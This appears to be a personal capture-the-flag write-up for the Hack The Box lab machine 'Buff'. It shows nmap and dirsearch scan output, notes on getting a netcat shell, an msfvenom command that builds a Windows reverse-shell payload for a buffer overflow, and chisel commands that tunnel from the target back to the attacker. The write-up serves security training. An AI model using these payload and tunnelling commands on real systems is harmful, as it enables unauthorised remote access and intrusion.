nmap
```
┌──(kali㉿kali)-[~/HTB/buff]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.25.107 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 20:06 EST
Nmap scan report for 10.129.25.107
Host is up (0.051s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   51.34 ms 10.10.14.1
2   51.87 ms 10.129.25.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
```

![Pasted image 20250108091111](<0. Attachments/Pasted image 20250108091111.png>)

```
┌──(kali㉿kali)-[~/HTB/buff]
└─$ dirsearch -u http://10.129.25.107:8080/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/buff/reports/http_10.129.25.107_8080/__25-01-07_20-09-29.txt

Target: http://10.129.25.107:8080/

[20:09:29] Starting: 
[20:09:33] 403 -    1KB - /%3f/
[20:09:33] 403 -    1KB - /%C0%AE%C0%AE%C0%AF                               
[20:09:33] 403 -    1KB - /%ff                                              
[20:09:37] 403 -    1KB - /.fishsrv.pl                                      
[20:09:38] 200 -   66B  - /.gitattributes                                   
[20:09:39] 403 -    1KB - /.ht_wsr.txt                                      
[20:09:39] 403 -    1KB - /.htaccess_extra                                  
[20:09:39] 403 -    1KB - /.htaccess.sample
[20:09:39] 403 -    1KB - /.htaccess.save                                   
[20:09:39] 403 -    1KB - /.htaccess.orig
[20:09:39] 403 -    1KB - /.htaccessBAK                                     
[20:09:39] 403 -    1KB - /.htaccessOLD2
[20:09:39] 403 -    1KB - /.html                                            
[20:09:39] 403 -    1KB - /.htpasswd_test                                   
[20:09:39] 403 -    1KB - /.htaccessOLD
[20:09:39] 403 -    1KB - /.htaccess.bak1                                   
[20:09:39] 403 -    1KB - /.htpasswds                                       
[20:09:39] 403 -    1KB - /.htaccess_orig
[20:09:39] 403 -    1KB - /.htm                                             
[20:09:39] 403 -    1KB - /.httr-oauth                                      
[20:09:39] 403 -    1KB - /.htaccess_sc                                     
[20:09:45] 403 -    1KB - /.ssh.asp                                         
[20:09:58] 200 -    5KB - /about.php                                        
[20:09:59] 403 -    1KB - /accounts.cgi                                     
[20:09:59] 403 -    1KB - /accounts.pl
[20:10:02] 403 -    1KB - /adm.cgi                                          
[20:10:02] 403 -    1KB - /adm.pl                                           
[20:10:04] 403 -    1KB - /admin.asp                                        
[20:10:04] 403 -    1KB - /admin.cgi                                        
[20:10:04] 403 -    1KB - /admin.pl                                         
[20:10:25] 403 -    1KB - /apply.cgi                                        
[20:10:26] 403 -    1KB - /AT-admin.cgi                                     
[20:10:27] 403 -    1KB - /auth.cgi                                         
[20:10:27] 403 -    1KB - /auth.pl                                          
[20:10:28] 403 -    1KB - /awstats.pl                                       
[20:10:33] 403 -    1KB - /cachemgr.cgi                                     
[20:10:35] 403 -    1KB - /cgi-bin/                                         
[20:10:35] 200 -    2KB - /cgi-bin/printenv.pl                              
[20:10:35] 403 -    1KB - /cgi.pl/                                          
[20:10:35] 403 -    1KB - /Cgishell.pl                                      
[20:10:37] 403 -    1KB - /cmdasp.asp                                       
[20:10:37] 403 -    1KB - /cmd-asp-5.1.asp                                  
[20:10:41] 403 -    1KB - /conn.asp                                         
[20:10:43] 200 -    4KB - /contact.php                                      
[20:10:46] 403 -    1KB - /dcadmin.cgi                                      
[20:10:46] 403 -    1KB - /debug.cgi                                        
[20:10:50] 200 -    4KB - /edit.php                                         
[20:10:51] 403 -    1KB - /error.asp                                        
[20:10:51] 403 -    1KB - /error/                                           
[20:10:51] 403 -    1KB - /errors.asp                                       
[20:10:53] 503 -    1KB - /examples/                                        
[20:10:53] 503 -    1KB - /examples/jsp/snp/snoop.jsp
[20:10:53] 503 -    1KB - /examples/jsp/index.html                          
[20:10:53] 503 -    1KB - /examples/servlet/SnoopServlet
[20:10:53] 503 -    1KB - /examples/servlets/index.html
[20:10:53] 503 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[20:10:53] 503 -    1KB - /examples/websocket/index.xhtml                   
[20:10:53] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[20:10:53] 503 -    1KB - /examples/servlets/servlet/CookieExample          
[20:10:53] 503 -    1KB - /examples                                         
[20:10:54] 403 -    1KB - /file_upload.asp                                  
[20:10:55] 200 -    4KB - /feedback.php                                     
[20:10:57] 403 -    1KB - /gbpass.pl                                        
[20:10:58] 403 -    1KB - /gotoURL.asp?url=google.com&id=43569              
[20:11:01] 403 -    1KB - /hndUnblock.cgi                                   
[20:11:01] 200 -  143B  - /home.php                                         
[20:11:03] 301 -  343B  - /img  ->  http://10.129.25.107:8080/img/          
[20:11:04] 301 -  347B  - /include  ->  http://10.129.25.107:8080/include/  
[20:11:04] 403 -    1KB - /include/                                         
[20:11:05] 403 -    1KB - /index.php::$DATA                                 
[20:11:06] 403 -    1KB - /install.asp                                      
[20:11:10] 200 -   18KB - /LICENSE                                          
[20:11:10] 200 -   18KB - /license                                          
[20:11:12] 403 -    1KB - /login.cgi                                        
[20:11:12] 403 -    1KB - /login.asp                                        
[20:11:12] 403 -    1KB - /login.pl                                         
[20:11:13] 403 -    1KB - /logout.asp                                       
[20:11:13] 403 -    1KB - /logs.pl
[20:11:21] 403 -    1KB - /members.cgi                                      
[20:11:21] 403 -    1KB - /members.pl                                       
[20:11:27] 403 -    1KB - /mt-xmlrpc.cgi                                    
[20:11:27] 403 -    1KB - /mt-check.cgi                                     
[20:11:27] 403 -    1KB - /mt.cgi                                           
[20:11:33] 403 -    1KB - /out.cgi                                          
[20:11:35] 403 -    1KB - /perlcmd.cgi                                      
[20:11:35] 403 -    1KB - /perl-reverse-shell.pl                            
[20:11:37] 403 -    1KB - /phpmyadmin                                       
[20:11:41] 403 -    1KB - /phpmyadmin/docs/html/index.html                  
[20:11:41] 403 -    1KB - /phpmyadmin/ChangeLog
[20:11:41] 403 -    1KB - /phpmyadmin/                                      
[20:11:41] 403 -    1KB - /phpmyadmin/doc/html/index.html                   
[20:11:41] 403 -    1KB - /phpmyadmin/index.php
[20:11:41] 403 -    1KB - /phpmyadmin/scripts/setup.php                     
[20:11:41] 403 -    1KB - /phpmyadmin/phpmyadmin/index.php                  
[20:11:41] 403 -    1KB - /phpmyadmin/README                                
[20:11:46] 301 -  347B  - /profile  ->  http://10.129.25.107:8080/profile/  
[20:11:53] 403 -    1KB - /ps_admin.cgi                                     
[20:11:55] 200 -  309B  - /README.MD                                        
[20:11:55] 200 -  309B  - /ReadMe.md                                        
[20:11:55] 200 -  309B  - /README.md
[20:11:55] 200 -  309B  - /readme.md
[20:11:55] 200 -  309B  - /Readme.md                                        
[20:11:57] 200 -  137B  - /register.php                                     
[20:12:02] 403 -    1KB - /server-info                                      
[20:12:03] 403 -    1KB - /server-status                                    
[20:12:02] 403 -    1KB - /server-status/                                   
[20:12:06] 403 -    1KB - /showcode.asp                                     
[20:12:07] 403 -    1KB - /signin.pl                                        
[20:12:07] 403 -    1KB - /signin.cgi                                       
[20:12:19] 403 -    1KB - /test.asp                                         
[20:12:19] 403 -    1KB - /test.cgi                                         
[20:12:23] 403 -    1KB - /Trace.axd::$DATA                                 
[20:12:25] 200 -  209B  - /up.php                                           
[20:12:26] 301 -  346B  - /Upload  ->  http://10.129.25.107:8080/Upload/    
[20:12:26] 403 -    1KB - /upload/                                          
[20:12:26] 403 -    1KB - /upload.asp
[20:12:26] 301 -  346B  - /upload  ->  http://10.129.25.107:8080/upload/    
[20:12:27] 403 -    1KB - /uploadfile.asp                                   
[20:12:27] 200 -  107B  - /upload.php                                       
[20:12:27] 403 -    1KB - /user.asp                                         
[20:12:37] 403 -    1KB - /web.config::$DATA                                
[20:12:37] 403 -    1KB - /webalizer                                        
[20:12:38] 403 -    1KB - /webalizer/                                       
[20:12:38] 403 -    1KB - /WebShell.cgi                                     
                                                                             
Task Completed                          
```

![Pasted image 20250109082630](<0. Attachments/Pasted image 20250109082630.png>)

![Pasted image 20250109083245](<0. Attachments/Pasted image 20250109083245.png>)

![Pasted image 20250109083338](<0. Attachments/Pasted image 20250109083338.png>)

![Pasted image 20250109083941](<0. Attachments/Pasted image 20250109083941.png>)

![Pasted image 20250109084010](<0. Attachments/Pasted image 20250109084010.png>)

getting a nc shell
![Pasted image 20250109085137](<0. Attachments/Pasted image 20250109085137.png>)

![Pasted image 20250109085120](<0. Attachments/Pasted image 20250109085120.png>)

to show port info on windows 
```
netstat -ano
```

give a tree structure of subfolders 
```
tree /f
```

![Pasted image 20250109090649](<0. Attachments/Pasted image 20250109090649.png>)

using ligolo-ng to tunnel and use exploit
![Pasted image 20250109094335](<0. Attachments/Pasted image 20250109094335.png>)

using buffer overflow
![Pasted image 20250109094459](<0. Attachments/Pasted image 20250109094459.png>)

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4445 -b '\x00\x0A\x0D' -f python -v payload
```

LIGOLO not working so trying chisel
![Pasted image 20250109101224](<0. Attachments/Pasted image 20250109101224.png>)

on host
```
chisel server -p 8000 --reverse
```

on target
```
.\chisel.exe client 10.10.14.3:8000 R:8888:localhost:8888
```

![Pasted image 20250109101358](<0. Attachments/Pasted image 20250109101358.png>)